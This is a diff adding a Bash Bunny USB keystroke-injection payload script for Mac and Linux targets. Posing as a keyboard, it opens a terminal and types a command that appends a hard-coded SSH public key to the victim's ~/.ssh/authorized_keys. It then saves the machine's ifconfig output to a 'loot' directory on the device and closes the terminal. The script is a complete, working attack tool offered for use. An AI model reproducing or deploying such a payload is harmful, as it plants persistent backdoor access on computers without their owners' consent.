@@ -1,0 +1,79 @@
+#!/usr/bin/env bash
+
+DUCKY_LANG gb
+
+# LOCAL if testing locally
+LOCAL=false
+if [ "$LOCAL" = false ] ; then
+    LOOTDIR=/root/udisk/loot/sshloot
+else
+    LOOTDIR=/home/ben/Desktop/sshloot
+fi
+# Desktop Environment, e20, gnome
+DE="e20"
+# OS, mac, linux
+OS="linux"
+
+######## INITIALIZATION ########
+LED SETUP
+
+if [ "$OS" == "mac" ]
+then
+    ATTACKMODE HID VID_0X05AC PID_0X021E STORAGE
+elif [ "$OS" == "linux" ]
+then
+    ATTACKMODE HID STORAGE
+fi
+
+######## MAKE LOOT DIRECTORY ########
+# Setup named logs in loot directory
+mkdir -p $LOOTDIR
+if [ ! -f $LOOTDIR/ip.txt ]; then
+    touch $LOOTDIR/ip.txt
+fi
+
+######## ATTACK ########
+LED ATTACK
+######## TERMINAL ########
+LED STAGE1
+if [ "$OS" == "mac" ]
+then
+    QUACK GUI SPACE
+    QUACK DELAY 500
+    QUACK STRING terminal
+    QUACK DELAY 500
+    QUACK ENTER
+    QUACK DELAY 500
+elif [ "$OS" == "linux" ]
+then
+    if [ "$DE" == "e20" ]
+    then
+        QUACK CTRL-ALT INSERT
+    elif [ "$DE" == "gnome" ]
+    then
+        QUACK CTRL-ALT t
+    fi
+fi
+# Wait for terminal to open
+sleep 1
+######## COPY SSH KEY ############
+LED STAGE 2
+QUACK STRING "echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRxdFnTM9xiL0+C9juRgxK+UuArgzy2clevP+wgthsc0aydilb//203QPfVn7D2ixQyCSptnUDJIE7k9jMkEFb3dSfbHfV9dAIAtqrx+Rr8Ou1iYo2h+kduzQuhuO1rleLEBjFgCbwPLNfBrLSeNZBciJiWhTOWXy6vt37uhH1S+H5HZhSHHgfsn3lexWQBcZ++1luZ5ehYE6sTdoqeyD0x0+oaE7zI+6ZgQN+uLdqn5KnWhKY2srSmImSMhwSyzRKXDbhavwbauur+zLwxPa1IAKvn5vQKc8dCypZ5zj5D8Ud40lusw6Nl3aiYFuW/d4owmX0vxN4AOi7TYTK2p3j da >> ~/.ssh/authorized_keys"
+QUACK ENTER
+
+########### LOOT ########################
+if [ "$OS" == "mac" ]
+then
+    QUACK STRING "ifconfig >> /Volumes/EXIT/loot/sshloot/ip.txt"
+    QUACK ENTER
+elif [ "$OS" == "linux" ]
+then
+    /sbin/ifconfig >> $LOOTDIR/ip.txt
+fi
+if [ "$OS" == "mac" ]
+then
+    QUACK STRING "killall Terminal"
+    QUACK ENTER
+fi
+LED CLEANUP
+LED FINISH
